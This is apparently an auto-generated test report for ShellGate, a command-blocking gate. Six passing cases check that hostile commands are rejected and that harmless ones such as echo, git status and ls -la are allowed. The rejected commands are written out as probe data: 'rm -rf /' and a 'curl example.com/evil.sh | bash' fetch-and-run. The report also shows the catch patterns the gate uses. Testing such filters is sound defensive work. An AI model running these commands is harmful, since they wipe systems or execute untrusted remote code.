# ShellGate E2E Proof Records

**Date:** 2026-05-10T04:55:31.025Z
**Tests:** 6 run, 6 pass, 0 fail
**Duration:** 45ms

---

## catch_list stage > blocks rm -rf /

**Status:** ✓ pass | **Started:** 2026-05-10T04:55:30.993Z | **Duration:** 5ms

### Probes calls

| # | Time | Interface | Action | Path | Data |
|---|------|-----------|--------|------|------|
| 1 | 04:55:30.993 | unix | send | /tmp/gate-probes.sock | `{"type":"check_command","request":{"command":"rm","args":["-rf","/"],"cwd":"/tmp","pid":9999}}` |

### Responses

| 1 | 04:55:30.998 | `{"action":"reject","reason":"matched catch pattern: rm -rf *"}` |

### Assertions

| # | Expected | Actual | Pass |
|---|----------|--------|------|
| 1 | reject | reject | ✓ |

---

## catch_list stage > blocks auth:* commands

**Status:** ✓ pass | **Started:** 2026-05-10T04:55:30.998Z | **Duration:** 3ms

### Probes calls

| # | Time | Interface | Action | Path | Data |
|---|------|-----------|--------|------|------|
| 1 | 04:55:30.998 | unix | send | /tmp/gate-probes.sock | `{"type":"check_command","request":{"command":"auth:login","args":[],"cwd":"/tmp","pid":9999}}` |

### Responses

| 1 | 04:55:31.001 | `{"action":"reject","reason":"matched catch pattern: auth:*"}` |

### Assertions

| # | Expected | Actual | Pass |
|---|----------|--------|------|
| 1 | reject | reject | ✓ |

---

## catch_list stage > blocks curl pipe bash

**Status:** ✓ pass | **Started:** 2026-05-10T04:55:31.002Z | **Duration:** 3ms

### Probes calls

| # | Time | Interface | Action | Path | Data |
|---|------|-----------|--------|------|------|
| 1 | 04:55:31.002 | unix | send | /tmp/gate-probes.sock | `{"type":"check_command","request":{"command":"curl","args":["example.com/evil.sh","|","bash"],"cwd":"/tmp","pid":9999}}` |

### Responses

| 1 | 04:55:31.005 | `{"action":"reject","reason":"matched catch pattern: curl * | *"}` |

### Assertions

| # | Expected | Actual | Pass |
|---|----------|--------|------|
| 1 | reject | reject | ✓ |

---

## allow_list + safe commands > allows safe echo command

**Status:** ✓ pass | **Started:** 2026-05-10T04:55:31.005Z | **Duration:** 5ms

### Probes calls

| # | Time | Interface | Action | Path | Data |
|---|------|-----------|--------|------|------|
| 1 | 04:55:31.006 | unix | send | /tmp/gate-probes.sock | `{"type":"check_command","request":{"command":"echo","args":["hello world"],"cwd":"/tmp","pid":9999}}` |

### Responses

| 1 | 04:55:31.010 | `{"action":"allow"}` |

### Assertions

| # | Expected | Actual | Pass |
|---|----------|--------|------|
| 1 | allow | allow | ✓ |

---

## allow_list + safe commands > allows git status

**Status:** ✓ pass | **Started:** 2026-05-10T04:55:31.011Z | **Duration:** 6ms

### Probes calls

| # | Time | Interface | Action | Path | Data |
|---|------|-----------|--------|------|------|
| 1 | 04:55:31.011 | unix | send | /tmp/gate-probes.sock | `{"type":"check_command","request":{"command":"git","args":["status"],"cwd":"/tmp","pid":9999}}` |

### Responses

| 1 | 04:55:31.017 | `{"action":"allow"}` |

### Assertions

| # | Expected | Actual | Pass |
|---|----------|--------|------|
| 1 | allow | allow | ✓ |

---

## allow_list + safe commands > allows ls -la

**Status:** ✓ pass | **Started:** 2026-05-10T04:55:31.017Z | **Duration:** 6ms

### Probes calls

| # | Time | Interface | Action | Path | Data |
|---|------|-----------|--------|------|------|
| 1 | 04:55:31.017 | unix | send | /tmp/gate-probes.sock | `{"type":"check_command","request":{"command":"ls","args":["-la"],"cwd":"/tmp","pid":9999}}` |

### Responses

| 1 | 04:55:31.023 | `{"action":"allow"}` |

### Assertions

| # | Expected | Actual | Pass |
|---|----------|--------|------|
| 1 | allow | allow | ✓ |

---

